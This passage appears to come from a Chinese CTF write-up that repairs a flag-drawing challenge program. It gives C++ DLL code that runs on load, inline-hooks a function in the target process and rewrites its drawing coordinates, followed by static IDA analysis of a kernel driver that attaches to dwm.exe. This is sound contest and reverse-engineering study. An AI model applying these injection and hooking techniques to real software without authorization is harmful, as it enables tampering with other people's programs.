/>std::set&lt;std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;&gt;s;<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> __int64 (*Func)(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);<br />__int64 <span style="color: rgb(255, 255, 182);">GetBaseAddr</span>() {<br />    HMODULE hMode = GetModuleHandle(<span style="color: rgb(198, 197, 254);">nullptr</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> (__int64)hMode;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span>* shellcode = <span style="color: rgb(255, 115, 253);">0</span>;<br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,  <span style="color: rgb(124, 124, 124);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                           <span style="color: rgb(124, 124, 124);">//jmp rax </span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br /><span style="color: rgb(255, 255, 182);">size_t</span> HookLen = <span style="color: rgb(255, 115, 253);">12</span>;<br />__int64 times = <span style="color: rgb(255, 115, 253);">100</span>;<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">printset</span>() {<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">auto</span> k : s) {<br />        printf(<span style="color: rgb(168, 255, 96);">"(%d,%d)\n"</span>, k.first, k.second);<br />    }<br />}<br />__int64 <span style="color: rgb(255, 255, 182);">HackShellcode</span>(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10) {<br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> flag = <span style="color: rgb(255, 115, 253);">1</span>;<br />    memcpy(shellcode, OriginCode,HookLen);              <span style="color: rgb(124, 124, 124);">//unhook</span><br />    <span style="color: rgb(124, 124, 124);">//</span><br />    <span style="color: rgb(255, 255, 182);">int</span> x = a1, y = a2;<br />    <span style="color: rgb(255, 255, 182);">int</span> v13, v14;<br />    <span style="color: rgb(150, 203, 254);">if</span> (x == <span style="color: rgb(255, 115, 253);">-950</span> &amp;&amp; y == <span style="color: rgb(255, 115, 253);">50</span>) {<br />        x = <span style="color: rgb(255, 115, 253);">50</span>;<br />        y = <span style="color: rgb(255, 115, 253);">50</span>;<br />        v13=x;<br />        v14=x*(y+<span style="color: rgb(255, 115, 253);">1</span>);<br />        <span style="color: rgb(124, 124, 124);">//printf("Origin: Stack[0]=%d Stack[1]=%d ",Stack[0],Stack[1]);</span><br />        <span style="color: rgb(124, 124, 124);">//printf("num=0x%x ",code[RIP]);</span><br />        a3=<span style="color: rgb(255, 115, 253);">0x524895</span>^<span style="color: rgb(255, 115, 253);">0x414345</span>;<br />        a4=(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)((a3 ^ (y + v13)) % <span style="color: rgb(255, 115, 253);">256</span><br />                        + (((a3 ^ (v13 * y)) % <span style="color: rgb(255, 115, 253);">256</span> + (((a3 ^ (y + v14)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>));<br />    }<br />    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);<br />    times--;<br />    <span style="color: rgb(150, 203, 254);">if</span> (times&gt;<span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"call shellcode(%d,%d,%d,%d,%x) retval=%d\n"</span>,x, y, a3, a4, a5, ret);          <br />    }<br />    <span style="color: rgb(255, 255, 182);">int</span> presize = s.size();<br />    s.insert({ x,y });<br />    <span style="color: rgb(150, 203, 254);">if</span> (s.size() == presize) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (flag) {<br />            printset();<br />            flag = <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />    }<br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//rehook</span><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">HookShellcode</span>() {<br />    __int64 base = GetBaseAddr();<br />    __int64 Ptr = base + <span style="color: rgb(255, 115, 253);">0x8308</span>;<br /><br />    shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />    <span style="color: rgb(150, 203, 254);">while</span> (!shellcode) {<br />        shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />        printf(<span style="color: rgb(168, 255, 96);">"Find shellcode Fail\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">200</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"shellcode addr=%p\n"</span>, shellcode);<br />    memcpy(OriginCode, shellcode,HookLen);              <span style="color: rgb(124, 124, 124);">//saved</span><br />    Func FuncPtr = HackShellcode;<br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)FuncPtr;       <span style="color: rgb(124, 124, 124);">//construct</span><br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//hook</span><br /><br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br />        AllocConsole();<br />        freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />        HookShellcode();<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}</code></pre><p>注入之后，在指定的位置输出了黄色方块</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=12d28f63&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlwmzZgjXkLqA38fG0oskDJsTRXdh6IwbOXPakDNekSGXlibYgzcx5VFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>说明修复思路是没有问题的，接下来可以用虚拟机流程把错误的坐标和对应的该操作数 dump 出来，hook 的时候进行替换。</p><p>后面用截图工具比了一下，发现它们水平距离都一样的，所以可以用已有的正确坐标参考，从上到下坐标分别为 <code style="font-family: SFMono-Regular, Consolas, ;">50,110,170,230...</code> 就是每隔一个查了 <code style="font-family: SFMono-Regular, Consolas, ;">60</code> 的距离，水平距离也同样是 60，那么最靠左的正确的方块是 <code style="font-family: SFMono-Regular, Consolas, ;">(410,290)</code>，肉眼分析下来，最左边的坐标是 50，y 坐标因为对对齐的也是 50，所以第一个色块是完美还原的。</p><p>那么最左边 6 个就是</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">50,50<br />50,110<br />50,170<br />50,230<br />50,290<br />50,350</code></pre><p>对角线延伸出去三个就是</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">110,110<br />170,170<br />230,230</code></pre><p>最后两个补齐 FLAG是</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">110,230<br />170,230</code></pre><p>最后的DLL：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;Windows.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;set&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;math.h&gt;</span></span><br />std::set&lt;std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;&gt;s;<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> __int64 (*Func)(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10);<br />__int64 <span style="color: rgb(255, 255, 182);">GetBaseAddr</span>() {<br />    HMODULE hMode = GetModuleHandle(<span style="color: rgb(198, 197, 254);">nullptr</span>);<br />    <span style="color: rgb(150, 203, 254);">return</span> (__int64)hMode;<br />}<br /><span style="color: rgb(255, 255, 182);">void</span>* shellcode = <span style="color: rgb(255, 115, 253);">0</span>;<br />BYTE HookCode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,  <span style="color: rgb(124, 124, 124);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span>                                           <span style="color: rgb(124, 124, 124);">//jmp rax </span><br />};<br />BYTE OriginCode[<span style="color: rgb(255, 115, 253);">0x50</span>];<br /><span style="color: rgb(255, 255, 182);">size_t</span> HookLen = <span style="color: rgb(255, 115, 253);">12</span>;<br />__int64 times = <span style="color: rgb(255, 115, 253);">100</span>;<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">printset</span>() {<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">auto</span> k : s) {<br />        printf(<span style="color: rgb(168, 255, 96);">"(%d,%d)\n"</span>, k.first, k.second);<br />    }<br />}<br /><span style="color: rgb(255, 255, 182);">int</span> val[] = {<span style="color: rgb(255, 115, 253);">5392533</span>,<span style="color: rgb(255, 115, 253);">5934636</span>,<span style="color: rgb(255, 115, 253);">9984722</span>,<span style="color: rgb(255, 115, 253);">11102301</span>,<span style="color: rgb(255, 115, 253);">7888111</span>,<span style="color: rgb(255, 115, 253);">9846439</span>,<span style="color: rgb(255, 115, 253);">4608533</span>,<span style="color: rgb(255, 115, 253);">8744398</span>,<span style="color: rgb(255, 115, 253);">7703662</span>,<span style="color: rgb(255, 115, 253);">10004148</span>,<span style="color: rgb(255, 115, 253);">8744654</span>};<br />std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;WrongPos[] = {<br />    {<span style="color: rgb(255, 115, 253);">-950</span>,<span style="color: rgb(255, 115, 253);">50</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">-390</span>},<br />    {<span style="color: rgb(255, 115, 253);">-950</span>,<span style="color: rgb(255, 115, 253);">170</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">-950</span>,<span style="color: rgb(255, 115, 253);">-210</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">350</span>},<br />    {<span style="color: rgb(255, 115, 253);">-890</span>,<span style="color: rgb(255, 115, 253);">-270</span>},<br />    {<span style="color: rgb(255, 115, 253);">170</span>,<span style="color: rgb(255, 115, 253);">-270</span>},<br />    {<span style="color: rgb(255, 115, 253);">-770</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">110</span>,<span style="color: rgb(255, 115, 253);">-390</span>},<br />    {<span style="color: rgb(255, 115, 253);">-830</span>,<span style="color: rgb(255, 115, 253);">170</span>},<br />};<br />std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>, <span style="color: rgb(255, 255, 182);">int</span>&gt;TargetPos[] = {<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">50</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">110</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">170</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">290</span>},<br />    {<span style="color: rgb(255, 115, 253);">50</span>,<span style="color: rgb(255, 115, 253);">350</span>},<br />    {<span style="color: rgb(255, 115, 253);">110</span>,<span style="color: rgb(255, 115, 253);">110</span>},<br />    {<span style="color: rgb(255, 115, 253);">170</span>,<span style="color: rgb(255, 115, 253);">170</span>},<br />    {<span style="color: rgb(255, 115, 253);">230</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">110</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />    {<span style="color: rgb(255, 115, 253);">170</span>,<span style="color: rgb(255, 115, 253);">230</span>},<br />};<br /><span style="color: rgb(255, 255, 182);">int</span> CountOfWrongPos=<span style="color: rgb(255, 115, 253);">11</span>;<br />__int64 <span style="color: rgb(255, 255, 182);">HackShellcode</span>(<span style="color: rgb(255, 255, 182);">int</span> a1, <span style="color: rgb(255, 255, 182);">int</span> a2, <span style="color: rgb(255, 255, 182);">int</span> a3, <span style="color: rgb(255, 255, 182);">int</span> a4, <span style="color: rgb(255, 255, 182);">int</span> a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10) {<br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> flag = <span style="color: rgb(255, 115, 253);">1</span>;<br />    memcpy(shellcode, OriginCode,HookLen);              <span style="color: rgb(124, 124, 124);">//unhook</span><br />    <span style="color: rgb(124, 124, 124);">//</span><br />    <span style="color: rgb(255, 255, 182);">int</span> x = a1, y = a2;<br />    <span style="color: rgb(255, 255, 182);">int</span> v13, v14;<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; CountOfWrongPos; i++) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (std::pair&lt;<span style="color: rgb(255, 255, 182);">int</span>,<span style="color: rgb(255, 255, 182);">int</span>&gt;{ x,y } == WrongPos[i]) {<br />            x = TargetPos[i].first;<br />            y = TargetPos[i].second;<br />            v13=x;<br />            v14=x*(y+<span style="color: rgb(255, 115, 253);">1</span>);<br />            a3=val[i]^<span style="color: rgb(255, 115, 253);">0x414345</span>;<br />            a4=(<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span>)((a3 ^ (y + v13)) % <span style="color: rgb(255, 115, 253);">256</span><br />                        + (((a3 ^ (v13 * y)) % <span style="color: rgb(255, 115, 253);">256</span> + (((a3 ^ (y + v14)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>));<br />            printf(<span style="color: rgb(168, 255, 96);">"Hook Value Success from position (%d,%d) to (%d,%d)\n"</span>,a1,a2,x,y);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        }<br />    }<br />    __int64 ret=(*(Func)shellcode)(x, y, a3, a4, a5, a6, a7, a8, a9, a10);<br />    times--;<br />    <span style="color: rgb(150, 203, 254);">if</span> (times&gt;<span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"call shellcode(%d,%d,%d,%d,%x) retval=%d\n"</span>,x, y, a3, a4, a5, ret);          <br />    }<br />    <span style="color: rgb(255, 255, 182);">int</span> presize = s.size();<br />    s.insert({ x,y });<br />    <span style="color: rgb(150, 203, 254);">if</span> (s.size() == presize) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (flag) {<br />            printset();<br />            flag = <span style="color: rgb(255, 115, 253);">0</span>;<br />        }<br />    }<br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//rehook</span><br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">HookShellcode</span>() {<br />    __int64 base = GetBaseAddr();<br />    __int64 Ptr = base + <span style="color: rgb(255, 115, 253);">0x8308</span>;<br /><br />    shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />    <span style="color: rgb(150, 203, 254);">while</span> (!shellcode) {<br />        shellcode = (<span style="color: rgb(255, 255, 182);">void</span>*)(*(__int64*)Ptr);<br />        printf(<span style="color: rgb(168, 255, 96);">"Find shellcode Fail\n"</span>);<br />        Sleep(<span style="color: rgb(255, 115, 253);">200</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"shellcode addr=%p\n"</span>, shellcode);<br />    memcpy(OriginCode, shellcode,HookLen);              <span style="color: rgb(124, 124, 124);">//saved</span><br />    Func FuncPtr = HackShellcode;<br />    *(__int64*)(HookCode + <span style="color: rgb(255, 115, 253);">2</span>) = (__int64)FuncPtr;       <span style="color: rgb(124, 124, 124);">//construct</span><br />    memcpy(shellcode, HookCode, HookLen);               <span style="color: rgb(124, 124, 124);">//hook</span><br /><br />}<br /><br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>( HMODULE hModule,<br />                       DWORD  ul_reason_for_call,<br />                       LPVOID lpReserved<br />                     )<br />{<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call)<br />    {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:<br />        AllocConsole();<br />        freopen(<span style="color: rgb(168, 255, 96);">"CONOUT$"</span>, <span style="color: rgb(168, 255, 96);">"w"</span>, stdout);<br />        HookShellcode();<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_ATTACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_THREAD_DETACH:<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;<br />}</code></pre><p>最终结果也是完美实现了</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c3ef564b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlPiaUz4rN4GicJibiap9UGPiblUBUvnfxZiaSsW8da1xIZlc6a3DdMC5CGyNA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><hr /><p>今天试试复盘这个决赛</p><p>&lt;!--more--&gt;</p><h2>题目</h2><h3>介绍</h3><p>这里有一个在屏幕上画flag的小程序，可好像出了点问题，flag丢失了，需要把它找回来，并尝试截图留念。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=01a64255&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl5kbZxQv0ib5m7lgZrJ9cyCusohYsX4Naicic6o8HXa5mBWEibcxkWUDIIA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>找回flag样例：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0d8f672f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRldvfXLBEgn0LJju0m7ibkXejrzib5v9zU6bvEKs4F8xd5jgmj30FvkJKg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h3>要求</h3><ul><li style="margin-left: 2px;"><p>自行寻找办法加载驱动文件，再执行题目exe文件。</p></li><li style="margin-left: 2px;"><p>不得直接patch系统组件实现绘制（如：直接编写D3D代码绘制flag），只能对题目自身代码进行修改或调用。</p></li><li style="margin-left: 2px;"><p>找回的flag需要和预期图案（包括颜色）一致，如果绘制结果存在偏差会扣除一定分数。</p></li><li style="margin-left: 2px;"><p>修复后的flag截图操作必须在题目同一系统环境中进行（如：虚拟机运行题目则在虚拟机中截图，本机运行题目则在本机截图；不得拍照）。</p></li><li style="margin-left: 2px;"><p>赛后需要提交找回flag的<span style="font-weight: 700;">截图</span>、<span style="font-weight: 700;">解题代码或文档</span>和<span style="font-weight: 700;">截图代码或文档</span>进行评分，方法越多得分越高。</p></li><li style="margin-left: 2px;"><p>建议使用系统版本：Win10 1809、Win10 1903、Win10 1909、Win10 2004、Win10 20h1、Win10 20h2、Win10 21h1、Win10 21h2，在虚拟机中可能无法正常显示图形。</p></li><li style="margin-left: 2px;"><p>提交结果打包为XXX_writeup_A.zip，XXX为名称，A为提交序号，从1开始。</p></li></ul><h2>分析</h2><p>P.S.，在做复现的时候发现虚拟机无法正常绘制，且自己 Win11 的物理机运行会蓝屏，因此本次复现不含动态调试部分，一切只停留于静态分析和理论阶段，刷它指定的系统成本过高了接受不了。</p><h3>驱动分析</h3><p>IDA 打开，</p><p><code style="font-family: SFMono-Regular, Consolas, ;">sub_140001150</code> 函数很像是注册的驱动卸载函数。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">sub_140001188</code> 函数应该就是获取了一下系统信息，没什么东西。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">sub_140001414</code> 函数往下跟到 <code style="font-family: SFMono-Regular, Consolas, ;">sub_1400014A0</code> 函数有大东西，不过这个函数不是直接调用的，像是注册了某种回调，三环程序应该是处罚这个回调的。</p><p>开头通过调用 <code style="font-family: SFMono-Regular, Consolas, ;">sub_140001318</code> 函数获得了 <code style="font-family: SFMono-Regular, Consolas, ;">dwm.exe</code> 的 <code style="font-family: SFMono-Regular, Consolas, ;">EPROCESS</code> 结构。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=60417ad0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlx27hiaak4lTnO3fwBuYdcT0OxIA8LicMQtUFv33zqtJtCiac1ejcTeUkQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>对于接下来调用的函数</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=c49ac4be&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlKNT4wEefwZ6icJbpbt7VM1PHc7j22QDurveOoD7ACxny8eib2d94JXpQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">sub_140001000</code> 比较像是获取指定进程的某个 <code style="font-family: SFMono-Regular, Consolas, ;">DLL</code>，具体也跟进来看看</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=d85195f7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlukrRAic5z8kWafNNIpKVumqNdObXy6SyfuCdM8ibibgx5mI37YGvAUiajw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>对于这些API，网上找到了一些说法：</p><p><span style="font-weight: 700;">GetUserModuleBaseAddress():</span> 实现取进程中模块基址，该功能在<code style="font-family: SFMono-Regular, Consolas, ;">《驱动开发：内核取应用层模块基地址》</code>中详细介绍过原理，这段代码核心原理如下所示，此处最需要注意的是如果是<code style="font-family: SFMono-Regular, Consolas, ;">32位进程</code>则我们需要得到<code style="font-family: SFMono-Regular, Consolas, ;">PPEB32 Peb32</code>结构体，该结构体通常可以直接使用<code style="font-family: SFMono-Regular, Consolas, ;">PsGetProcessWow64Process()</code>这个内核函数获取到，而如果是<code style="font-family: SFMono-Regular, Consolas, ;">64位进程</code>则需要将寻找PEB的函数替换为<code style="font-family: SFMono-Regular, Consolas, ;">PsGetProcessPeb()</code></p><p>这个地方也不难判断，就是获取 PEB 结构体，只不过多了一个 32 位和 64 位的判断，以 32 位的为例，中间有类似遍历链表的写法，如果找到了那么把某个结果保存到第二个参数指向的位置然后返回。</p><p>这里且当 <code style="font-family: SFMono-Regular, Consolas, ;">sub_140001264(v24, "D3DCompile");</code> 函数是获取了某个函数的地址作为返回值出去的，随后是比较关键的点</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=051a8421&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl3b59va47Fn4RicKMLYxicdZdjpeqxL8BH0RibzLTPuKnpOhr7LOhKSnzA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>调用了两次 <code style="font-family: SFMono-Regular, Consolas, 